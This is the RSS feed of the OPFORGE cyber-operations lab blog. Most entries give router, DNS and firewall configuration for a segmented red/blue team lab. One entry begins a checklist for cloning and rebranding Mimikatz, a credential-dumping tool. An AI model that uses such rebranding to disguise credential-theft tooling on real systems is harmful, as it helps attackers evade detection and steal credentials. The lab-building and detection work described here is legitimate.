<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Latest Posts from the OPFORGE Project on OPFORGE</title><link>https://opforge.dev/</link><description>Recent content in Latest Posts from the OPFORGE Project on OPFORGE</description><image><title>OPFORGE</title><url>https://opforge.dev/preview.png</url><link>https://opforge.dev/preview.png</link></image><generator>Hugo -- 0.147.0</generator><language>en-us</language><lastBuildDate>Thu, 19 Jun 2025 18:45:00 -0500</lastBuildDate><atom:link href="https://opforge.dev/index.xml" rel="self" type="application/rss+xml"/><item><title>Post 7: VLAN Foundations and DMZ Segmentation</title><link>https://opforge.dev/posts/opforge_post_7_vlan_segmentation/</link><pubDate>Thu, 19 Jun 2025 18:45:00 -0500</pubDate><guid>https://opforge.dev/posts/opforge_post_7_vlan_segmentation/</guid><description>&lt;blockquote>
&lt;p>&amp;ldquo;Divide and rule, the politician cries; unite and lead, is watchword of the wise.&amp;rdquo; — Johann Wolfgang von Goethe&lt;/p>&lt;/blockquote>
&lt;h1 id="-vlan-foundations-and-dmz-segmentation">✨ VLAN Foundations and DMZ Segmentation&lt;/h1>
&lt;p>This post documents the foundational setup of VLAN-based segmentation in the OPFORGE lab, focusing on the transition from flat subnets to trunked interfaces and routed VLANs. It marks a major step in the network maturity of the lab, preparing for more realistic Red Team lateral movement simulations and Blue Team detection scenarios.&lt;/p></description></item><item><title>Post 6: DNS and Routing Lock-in across OPFORGE Zones</title><link>https://opforge.dev/posts/2025-06-19-post-6-routing-dns-success/</link><pubDate>Thu, 19 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-06-19-post-6-routing-dns-success/</guid><description>&lt;h1 id="-phase-summary">✅ Phase Summary&lt;/h1>
&lt;p>We’ve reached a critical milestone: stable &lt;strong>end-to-end routing and DNS resolution across all OPFORGE zones&lt;/strong>, including RED_NET, INTERNAL_NET, and DMZ. This post captures what it took to get there, the routing fixes, NAT updates, DNS handoffs, and the principle of least privilege in firewall policies.&lt;/p>
&lt;hr>
&lt;h2 id="-background">🧠 Background&lt;/h2>
&lt;p>The OPFORGE lab was originally designed with segmentation across five main zones:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>RED_NET&lt;/strong> (Offensive tools and test payloads)&lt;/li>
&lt;li>&lt;strong>INTERNAL_NET&lt;/strong> (Enterprise clients and DC)&lt;/li>
&lt;li>&lt;strong>EXT_NET&lt;/strong> (Gateway between RED and DMZ)&lt;/li>
&lt;li>&lt;strong>DMZ_NET&lt;/strong> (Public-facing infrastructure simulation)&lt;/li>
&lt;li>&lt;strong>InternetSim&lt;/strong> (Outbound internet access)&lt;/li>
&lt;/ul>
&lt;p>The challenge was building &lt;strong>a realistic trust boundary&lt;/strong> enforced by routers and firewalls—while ensuring systems could still route, resolve, and log across appropriate zones.&lt;/p></description></item><item><title>Post 5: DNS &amp; Routing End-to-End</title><link>https://opforge.dev/posts/opforge_post_5_dns_route/</link><pubDate>Tue, 17 Jun 2025 02:57:00 -0500</pubDate><guid>https://opforge.dev/posts/opforge_post_5_dns_route/</guid><description>&lt;blockquote>
&lt;p>&amp;ldquo;If you know the way broadly, you will see it in all things.&amp;rdquo; — Miyamoto Musashi&lt;/p>&lt;/blockquote>
&lt;h1 id="-dns--routing-end-to-end">✨ DNS &amp;amp; Routing End-to-End&lt;/h1>
&lt;p>This post captures the initial end-to-end routing and DNS resolution across segmented subnets in the OPFORGE lab. It enabled reliable communication across infrastructure zones and laid the groundwork for centralized visibility and detection.&lt;/p>
&lt;hr>
&lt;h2 id="-abstract">📌 Abstract&lt;/h2>
&lt;p>&lt;strong>Problem:&lt;/strong> The initial network configuration lacked reliable inter-segment routing and DNS resolution, limiting endpoint communication and visibility into host activity.&lt;/p></description></item><item><title>Post 4: Initial Connectivity – Red to DMZ Validation</title><link>https://opforge.dev/posts/opforge_post_4_red_to_dmz./</link><pubDate>Tue, 17 Jun 2025 02:55:00 -0500</pubDate><guid>https://opforge.dev/posts/opforge_post_4_red_to_dmz./</guid><description>&lt;blockquote>
&lt;p>&amp;ldquo;In the midst of chaos, there is also opportunity.&amp;rdquo; — Sun Tzu&lt;/p>&lt;/blockquote>
&lt;h1 id="-initial-connectivity--red-to-dmz-validation">✨ Initial Connectivity – Red to DMZ Validation&lt;/h1>
&lt;p>This post captures the preliminary test to confirm routed communication between the Red Team subnet and the DMZ prior to full lab routing. It served as a necessary checkpoint to ensure that the segmented network was behaving as expected before DNS, NAT, and VLAN tagging were added.&lt;/p>
&lt;hr>
&lt;h2 id="-abstract">📌 Abstract&lt;/h2>
&lt;p>&lt;strong>Problem:&lt;/strong> With the new segmented topology in OPFORGE, we needed to verify that basic IP connectivity from RED → DMZ was functional before layering on DNS and full routing.&lt;/p></description></item><item><title>Post 3: Foundational Segmentation Setup</title><link>https://opforge.dev/posts/opforge_post_3_segmentation/</link><pubDate>Tue, 17 Jun 2025 02:49:00 -0500</pubDate><guid>https://opforge.dev/posts/opforge_post_3_segmentation/</guid><description>&lt;blockquote>
&lt;p>&amp;ldquo;Order and simplification are the first steps toward mastery of a subject.&amp;rdquo; — Thomas Mann&lt;/p>&lt;/blockquote>
&lt;h1 id="-foundational-segmentation-setup">✨ Foundational Segmentation Setup&lt;/h1>
&lt;p>This post captures the introduction of initial segmentation boundaries within the OPFORGE lab. Before advanced VLAN tagging and DMZ logic, basic subnet design and routing were validated to support scalable infrastructure development.&lt;/p>
&lt;hr>
&lt;h2 id="-abstract">📌 Abstract&lt;/h2>
&lt;p>&lt;strong>Problem Statement:&lt;/strong> The original flat lab design limited control over traffic flow and security boundaries, making it unsuitable for advanced threat simulation or detection testing.&lt;/p></description></item><item><title>OPFORGE Routing Plan: Rhymed Segmented Flow</title><link>https://opforge.dev/docs/opf_routing_segmented_rhymed/</link><pubDate>Tue, 17 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/docs/opf_routing_segmented_rhymed/</guid><description>&lt;h2 id="-goal">🎯 Goal&lt;/h2>
&lt;p>Enforce logical traffic flow through each security zone in OPFORGE using a clearly segmented and rhymed IP scheme.&lt;/p>
&lt;pre tabindex="0">&lt;code>RED_NET → RTR_RED → RTR_INET → RTR_EXT → FW_DMZ → RTR_INT → INTERNAL_NET
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="-subnet-allocation-by-zone">🔐 Subnet Allocation by Zone&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Zone/Link&lt;/th>
&lt;th>Subnet&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>External Internet&lt;/td>
&lt;td>&lt;code>192.168.1.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>1 = Origin&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>RED_NET&lt;/td>
&lt;td>&lt;code>192.168.10.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>10 = Tension&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>RED ↔ INET Transit&lt;/td>
&lt;td>&lt;code>192.168.20.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>20 = Handoff&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>INET ↔ EXT Transit&lt;/td>
&lt;td>&lt;code>192.168.30.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>30 = Throttle&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>EXT ↔ DMZ Transit&lt;/td>
&lt;td>&lt;code>192.168.40.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>40 = Border&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DMZ ↔ INTERNAL Transit&lt;/td>
&lt;td>&lt;code>192.168.50.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>50 = Core Door&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>INTERNAL_NET&lt;/td>
&lt;td>&lt;code>192.168.60.0/24&lt;/code>&lt;/td>
&lt;td>&lt;code>60 = Fix-it Net&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;h2 id="-expected-ip-assignments">🚦 Expected IP Assignments&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Device&lt;/th>
&lt;th>Interface&lt;/th>
&lt;th>IP Address&lt;/th>
&lt;th>Connected To&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>opf-rt-red&lt;/code>&lt;/td>
&lt;td>&lt;code>eth0&lt;/code>&lt;/td>
&lt;td>192.168.10.1/24&lt;/td>
&lt;td>RED_NET&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-red&lt;/code>&lt;/td>
&lt;td>&lt;code>eth1&lt;/code>&lt;/td>
&lt;td>192.168.20.1/24&lt;/td>
&lt;td>&lt;code>opf-rt-inet&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-inet&lt;/code>&lt;/td>
&lt;td>&lt;code>eth0&lt;/code>&lt;/td>
&lt;td>192.168.20.2/24&lt;/td>
&lt;td>&lt;code>opf-rt-red&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-inet&lt;/code>&lt;/td>
&lt;td>&lt;code>eth1&lt;/code>&lt;/td>
&lt;td>192.168.30.1/24&lt;/td>
&lt;td>&lt;code>opf-rt-ext&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-ext&lt;/code>&lt;/td>
&lt;td>&lt;code>eth0&lt;/code>&lt;/td>
&lt;td>192.168.30.2/24&lt;/td>
&lt;td>&lt;code>opf-rt-inet&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-ext&lt;/code>&lt;/td>
&lt;td>&lt;code>eth1&lt;/code>&lt;/td>
&lt;td>192.168.40.1/24&lt;/td>
&lt;td>&lt;code>opf-fw-dmz&lt;/code> (em0)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-fw-dmz&lt;/code>&lt;/td>
&lt;td>&lt;code>em0&lt;/code>&lt;/td>
&lt;td>192.168.40.2/24&lt;/td>
&lt;td>&lt;code>opf-rt-ext&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-fw-dmz&lt;/code>&lt;/td>
&lt;td>&lt;code>em1&lt;/code>&lt;/td>
&lt;td>192.168.50.1/24&lt;/td>
&lt;td>&lt;code>opf-rt-int&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-int&lt;/code>&lt;/td>
&lt;td>&lt;code>eth0&lt;/code>&lt;/td>
&lt;td>192.168.50.2/24&lt;/td>
&lt;td>&lt;code>opf-fw-dmz&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>opf-rt-int&lt;/code>&lt;/td>
&lt;td>&lt;code>eth1&lt;/code>&lt;/td>
&lt;td>192.168.60.1/24&lt;/td>
&lt;td>INTERNAL_NET&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;h2 id="-route-propagation-examples">🧭 Route Propagation (Examples)&lt;/h2>
&lt;h3 id="on-opf-rt-red">On &lt;code>opf-rt-red&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>set protocols static route 192.168.60.0/24 next-hop 192.168.20.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="on-opf-rt-inet">On &lt;code>opf-rt-inet&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>set protocols static route 192.168.60.0/24 next-hop 192.168.30.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="on-opf-rt-ext">On &lt;code>opf-rt-ext&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>set protocols static route 192.168.60.0/24 next-hop 192.168.40.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="on-opf-fw-dmz-pfsense-cli">On &lt;code>opf-fw-dmz&lt;/code> (pfSense CLI)&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>route add -net 192.168.60.0/24 192.168.50.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To persist:&lt;/p></description></item><item><title>About OPFORGE</title><link>https://opforge.dev/about/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/about/</guid><description>&lt;h1 id="-about-opforge">🔧 About OPFORGE&lt;/h1>
&lt;p>&lt;strong>OPFORGE&lt;/strong> is a purpose-built, full-spectrum cyber operations lab designed to fuse red team emulation, blue team detection, and AI/ML integration into a living portfolio of validated cybersecurity capabilities.&lt;/p>
&lt;p>Originally created as a threat emulation testbed, OPFORGE has evolved into a scalable platform for demonstrating hands-on technical depth across disciplines—anchored to certifications, graduate-level research, and operational experience.&lt;/p>
&lt;hr>
&lt;h2 id="-mission">🎯 Mission&lt;/h2>
&lt;p>To &lt;strong>transform certifications, technical expertise, and advanced academic learning into working cyber capability&lt;/strong>, with real artifacts, modular infrastructure, and educational value.&lt;/p></description></item><item><title>First Route, First Blood: Standing Up RED NET</title><link>https://opforge.dev/posts/opforge_post_2_routing/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_2_routing/</guid><description>&lt;blockquote>
&lt;p>&lt;em>&amp;ldquo;Before you can emulate an adversary, you must be able to reach the battlefield.&amp;rdquo;&lt;/em>&lt;/p>&lt;/blockquote>
&lt;h3 id="-overview">🧭 Overview&lt;/h3>
&lt;p>In Post #1, we covered the initial design philosophy behind OPFORGE and the high-level segmentation plan. Now it’s time to get traffic moving. In this post, we focus on building and validating the first complete routing path from RED_NET to the public internet.&lt;/p>
&lt;p>This milestone enables offensive tooling on &lt;code>opf-red01&lt;/code> and &lt;code>opf-lnx01&lt;/code> to begin live-fire interaction with the outside world in a controlled and observable way. The setup also establishes our first artifact set: routed VyOS configs, packet captures, and validation logs.&lt;/p></description></item><item><title>OPFORGE Genesis: Designing a Full-Spectrum Cyber Lab</title><link>https://opforge.dev/posts/opforge_post_1_genesis/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_1_genesis/</guid><description>&lt;blockquote>
&lt;p>&lt;em>&amp;ldquo;Before we wage war in cyberspace, we must first build the battlefield.&amp;rdquo;&lt;/em>&lt;/p>&lt;/blockquote>
&lt;h3 id="-overview">🧭 Overview&lt;/h3>
&lt;p>Welcome to the first post of the OPFORGE blog series. This series walks through the step-by-step development of OPFORGE: a purpose-built, full-spectrum cyber operations lab environment designed to showcase and implement real-world capabilities tied to professional certifications, advanced education, and operational experience.&lt;/p>
&lt;p>In this foundational post, we focus on Phase 1: the initial lab topology and routing architecture. This layer sets the stage for future red vs blue scenarios, AI-driven detection, and system-level investigations.&lt;/p></description></item><item><title>OPFORGE Network Internet Access Setup Guide</title><link>https://opforge.dev/posts/opforge-internet-setup/</link><pubDate>Thu, 12 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge-internet-setup/</guid><description>&lt;h1 id="opforge-network-internet-access-setup-guide">OPFORGE Network Internet Access Setup Guide&lt;/h1>
&lt;p>This guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers &lt;code>opf-rtred&lt;/code> and &lt;code>opf-rt-inet&lt;/code>, as well as ensuring connectivity from a host such as &lt;code>opf-lnx01&lt;/code>.&lt;/p>
&lt;hr>
&lt;h2 id="-1-opf-rt-inet-configuration-internet-gateway">🔧 1. &lt;code>opf-rt-inet&lt;/code> Configuration (Internet Gateway)&lt;/h2>
&lt;h3 id="interfaces">Interfaces&lt;/h3>
&lt;ul>
&lt;li>&lt;code>eth0&lt;/code>: 192.168.10.2/24 (RED_NET)&lt;/li>
&lt;li>&lt;code>eth1&lt;/code>: 192.168.1.25/24 (WAN - External/Internet-facing)&lt;/li>
&lt;/ul>
&lt;h3 id="commands">Commands&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>configure
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set interface IPs (if not set)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set interfaces ethernet eth0 address 192.168.10.2/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set interfaces ethernet eth1 address 192.168.1.25/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Default route to WAN gateway&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set protocols static route 0.0.0.0/0 next-hop 192.168.1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Enable NAT for RED_NET to WAN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> outbound-interface eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> source address 192.168.10.0/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> translation address masquerade
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Enable DNS forwarding&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding listen-address 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding allow-from 192.168.10.0/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding name-server 1.1.1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding name-server 8.8.8.8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="-2-opf-rtred-configuration-red-network-router">🔧 2. &lt;code>opf-rtred&lt;/code> Configuration (Red Network Router)&lt;/h2>
&lt;h3 id="interfaces-1">Interfaces&lt;/h3>
&lt;ul>
&lt;li>&lt;code>eth0&lt;/code>: 192.168.10.1/24 (RED_NET)&lt;/li>
&lt;/ul>
&lt;h3 id="commands-1">Commands&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>configure
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set static default route to forward traffic to opf-rt-inet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set protocols static route 0.0.0.0/0 next-hop 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set DNS resolver to point to opf-rt-inet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set system name-server 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="-3-opf-lnx01-or-red-network-host">🧪 3. &lt;code>opf-lnx01&lt;/code> or Red Network Host&lt;/h2>
&lt;p>Ensure the following are configured on your RED_NET endpoints:&lt;/p></description></item><item><title>OPFORGE Rebrand Checklist for Mimikatz</title><link>https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/</link><pubDate>Sat, 31 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/</guid><description>&lt;h1 id="opforge-rebrand-checklist-for-mimikatz">OPFORGE Rebrand Checklist for Mimikatz&lt;/h1>
&lt;p>&lt;em>This step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.&lt;/em>&lt;/p>
&lt;p>&lt;strong>Maintainer&lt;/strong>: Alfredo Pelaez&lt;br>
&lt;strong>Date&lt;/strong>: 2025-05-31&lt;br>
&lt;strong>Project Alignment&lt;/strong>: &lt;a href="https://opforge.dev">OPFORGE&lt;/a> | High-Yield Performance &amp;amp; Results (H.Y.P.R.) Mindset&lt;/p>
&lt;hr>
&lt;h2 id="-phase-1-clone-and-prepare-the-repo">✅ Phase 1: Clone and Prepare the Repo&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;input disabled="" type="checkbox"> Clone the Mimikatz repository:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>git clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;input disabled="" type="checkbox"> Create a backup copy:&lt;/p></description></item><item><title>Correcting OPF-DC01 Placement in ADINFRA Segment</title><link>https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/</guid><description>&lt;h2 id="background">Background&lt;/h2>
&lt;p>Originally, &lt;code>OPF-DC01&lt;/code> was deployed with an IP address in the &lt;code>CSOCINFRA (192.168.20.0/24)&lt;/code> subnet. However, per OPFORGE&amp;rsquo;s logical segmentation, all domain services must reside in the &lt;code>ADINFRA (192.168.40.0/24)&lt;/code> segment to maintain operational and architectural integrity.&lt;/p>
&lt;hr>
&lt;h2 id="problem">Problem&lt;/h2>
&lt;ul>
&lt;li>&lt;code>OPF-DC01&lt;/code> had IP &lt;code>192.168.20.100&lt;/code> (incorrect subnet).&lt;/li>
&lt;li>The gateway was misconfigured as &lt;code>192.168.50.5&lt;/code> (C2 CONTROL).&lt;/li>
&lt;li>This broke domain service accessibility and violated the subnet&amp;rsquo;s trust boundary.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;h3 id="1-re-ip-opf-dc01-to-adinfra">1. Re-IP OPF-DC01 to ADINFRA&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>New-NetIPAddress -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -IPAddress &lt;span style="color:#e6db74">&amp;#34;192.168.40.100&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -PrefixLength &lt;span style="color:#ae81ff">24&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -DefaultGateway &lt;span style="color:#e6db74">&amp;#34;192.168.40.5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2-update-dns">2. Update DNS&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Set-DnsClientServerAddress -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> -ServerAddresses &lt;span style="color:#e6db74">&amp;#34;192.168.40.100&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3-fix-default-route">3. Fix Default Route&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Remove-NetRoute -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> -NextHop &lt;span style="color:#ae81ff">192.168&lt;/span>.50.5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>New-NetRoute -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -DestinationPrefix &lt;span style="color:#e6db74">&amp;#34;0.0.0.0/0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -NextHop &lt;span style="color:#e6db74">&amp;#34;192.168.40.5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="results">Results&lt;/h2>
&lt;ul>
&lt;li>&lt;code>OPF-DC01&lt;/code> now properly resides at &lt;code>192.168.40.100&lt;/code>.&lt;/li>
&lt;li>Routing flows through &lt;code>opf-fw01&lt;/code> via gateway &lt;code>192.168.40.5&lt;/code>.&lt;/li>
&lt;li>It is ready to serve domain joins from endpoints like &lt;code>OPF-MBR01&lt;/code>.&lt;/li>
&lt;/ul></description></item><item><title>Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense</title><link>https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/</guid><description>&lt;h2 id="-problem-summary">🧩 Problem Summary&lt;/h2>
&lt;p>After placing &lt;code>OPF-DC01&lt;/code> into the &lt;code>ADINFRA&lt;/code> subnet (192.168.40.0/24), &lt;code>OPF-MBR01&lt;/code> was unable to resolve public domains such as &lt;code>google.com&lt;/code>. DNS requests to &lt;code>192.168.40.100&lt;/code> (the DC) failed to resolve, even though routing to the firewall was functional.&lt;/p>
&lt;hr>
&lt;h2 id="-root-cause">🔍 Root Cause&lt;/h2>
&lt;p>By default, &lt;code>OPF-DC01&lt;/code> was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like &lt;code>8.8.8.8&lt;/code> and &lt;code>1.1.1.1&lt;/code> failed because &lt;code>OPF-DC01&lt;/code> had &lt;strong>no internet access&lt;/strong> in the segmented lab setup.&lt;/p></description></item><item><title>Installing Sysinternals Suite Offline in OPFORGE</title><link>https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/</guid><description>&lt;h2 id="-purpose">🎯 Purpose&lt;/h2>
&lt;p>In the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Here&amp;rsquo;s how to install the full &lt;a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals Suite&lt;/a> offline to a standard lab path.&lt;/p>
&lt;hr>
&lt;h2 id="-installation-directory">🗂️ Installation Directory&lt;/h2>
&lt;p>All tools are installed to:&lt;/p>
&lt;pre tabindex="0">&lt;code>C:\OPFORGE\Tools\Sysinternals
&lt;/code>&lt;/pre>&lt;p>This ensures consistent, reproducible builds and clean environment variables.&lt;/p>
&lt;hr>
